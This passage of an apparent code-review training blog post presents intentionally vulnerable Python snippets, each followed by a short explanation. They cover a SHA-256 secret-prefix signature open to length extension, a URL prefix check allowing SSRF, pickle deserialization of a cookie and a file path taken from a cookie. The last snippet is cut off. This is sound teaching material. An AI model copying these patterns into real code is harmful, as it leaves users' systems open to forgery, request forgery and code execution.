&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;flask &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Flask,redirect
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;secrets &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;token_hex
&lt;&#x2F;span&gt;&lt;span&gt;secret = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[....]&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;app = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Flask&lt;&#x2F;span&gt;&lt;span&gt;(__name__)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sign_for_payment&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;payment_information&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# compute signature to ensure the payment details
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# cannot be tampered with
&lt;&#x2F;span&gt;&lt;span&gt;  data = secret+payment_information
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;hashlib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(data.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;@app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;route&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;redirect_for_payment&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;redirect_for_payment&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    tx_id = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;token_hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;) 
&lt;&#x2F;span&gt;&lt;span&gt;    payment_info = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;transaction_id=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+tx_id+&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;amount=20.00&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    params =payment_info+&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;sign=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sign_for_payment&lt;&#x2F;span&gt;&lt;span&gt;(payment_info)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;redirect&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;pentesterlab.com&#x2F;payment?&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+params, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;code&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;302&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This code snippet is an example of cryptographic flaw of using sha2 as a hashing algorithm. SHA2 is susceptible to an attacked called &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Length_extension_attack&quot;&gt;length extension&lt;&#x2F;a&gt;. A length extension attack can allow an attacker to use a Hash and the length of the message and extend the message. In the example code snippet, the &lt;code&gt;sign_for_payment&lt;&#x2F;code&gt; function is using SHA2 to encode the hash and the &lt;code&gt;redirect_for_payment&lt;&#x2F;code&gt; function will use it to sign payment information as a validation control measure. The weakness in this code snippet is found in the &lt;code&gt;payment_info&lt;&#x2F;code&gt; variable of which the &lt;code&gt;amount&lt;&#x2F;code&gt; is concatenated before encoding into hex format. By appending a duplicate &lt;code&gt;amount&lt;&#x2F;code&gt; parameter with a nafarious value assigned, it would overwrite the initial float amount ($20). This is possible because with length extension attacks, an attacker knows the state of the hashed key and messaging pair up to the point of appending a duplicate &lt;code&gt;amount&lt;&#x2F;code&gt; parameter. It is then trivial to figure out the hashing algorithm used and generate a new hash digest. The new forged hash digest will be sent back to the server as a valid request because the signature being the same length as the original. Hence why there is no need to know the original key to sign the message and the forged hash digest is accepted as if the password was known. &lt;&#x2F;p&gt;
&lt;h2 id=&quot;python-02&quot;&gt;Python 02&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;flask &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Flask,redirect,request
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;secrets &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;token_hex
&lt;&#x2F;span&gt;&lt;span&gt;app = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Flask&lt;&#x2F;span&gt;&lt;span&gt;(__name__)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;@app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;route&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;fetch&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    url = request.args.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;url.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;vulndomain.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;):
&lt;&#x2F;span&gt;&lt;span&gt;      response = urllib.request.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(url)
&lt;&#x2F;span&gt;&lt;span&gt;      html = response.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;html
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This code review snippet is an example of why URLs should be ended in a &lt;code&gt;&#x2F;&lt;&#x2F;code&gt;. Without the &lt;code&gt;&#x2F;&lt;&#x2F;code&gt;, a malicious attacker can register a nefarious top level domain that could bypass the filter by creating a subdomain such as &lt;code&gt;vulndomain.com.evildomain.com&lt;&#x2F;code&gt;. This flaw is called a server side request forgery (SSRF) as in the line where &lt;code&gt;response.read()&lt;&#x2F;code&gt; is found, the server will read the request and return the response value. This flaw can be leveraged by fetching data from malicious endpoints and have the server parse the information.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;python-03&quot;&gt;Python 03&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;http.server &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;BaseHTTPRequestHandler, HTTPServer
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;http.cookies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;SimpleCookie
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pickle
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;MyServer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;BaseHTTPRequestHandler&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;do_GET&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;      cookies = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SimpleCookie&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.headers.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cookie&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;cookies.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;):
&lt;&#x2F;span&gt;&lt;span&gt;        username=pickle.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(base64.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b64decode&lt;&#x2F;span&gt;&lt;span&gt;(cookies.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).value))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        username=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stranger&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_response&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-type&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&#x2F;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;end_headers&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Hello&amp;lt;&#x2F;title&amp;gt;&amp;lt;&#x2F;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;h1&amp;gt;Hello &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;h1&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; % username, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.wfile.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;body&amp;gt;&amp;lt;&#x2F;html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ == &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;:
&lt;&#x2F;span&gt;&lt;span&gt;    webServer = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HTTPServer&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.0.0.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;), MyServer)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        webServer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serve_forever&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;KeyboardInterrupt:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;    webServer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;server_close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Server stopped.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The weakness in this python source code can be found in the &lt;code&gt;pickle.loads&lt;&#x2F;code&gt; method. Pickle is a python module that is used for serializing and deserializing data. Data serialization is a process to convert a state of data object into a byte stream such as the following commonly used formats: JSON, YAML, and XML. Data deserialization is the reverse process where the byte stream is recreated into an object stored in memory. In the code snippet, the cookie is fetched from HTTP headers and reads the cookie value from the &lt;code&gt;username&lt;&#x2F;code&gt; attribute. This can pose an issue as a cookie can be easily manipulated as a malicious source of data for the server to be read from. As displayed in the example of &lt;code&gt;pickle.loads&lt;&#x2F;code&gt;, the module deserializes the &lt;code&gt;username&lt;&#x2F;code&gt; cookie value using &lt;code&gt;base64.b64decode&lt;&#x2F;code&gt; method. Further research shows that a directive called &lt;code&gt;reduce&lt;&#x2F;code&gt; can be used to create a malicious serialized object. In theory, if a serialized object is encoded into a base64 payload into the cookie value, the HTTP server would know how to deserialize it using base64 decode function.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;python-04&quot;&gt;Python 04&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;http.server &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;BaseHTTPRequestHandler, HTTPServer
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;http.cookies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;SimpleCookie
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;MyServer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;BaseHTTPRequestHandler&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;do_GET&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;      cookies = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SimpleCookie&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.headers.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cookie&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;cookies.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;session_id&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;):
&lt;&#x2F;span&gt;&lt;span&gt;        username=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(cookies.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;session_id&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).value).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] 
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        username=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stranger&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_response&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_header&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-type&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&#x2F;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;end_headers&lt;&#x2F;span&gt;&lt;span&gt;()
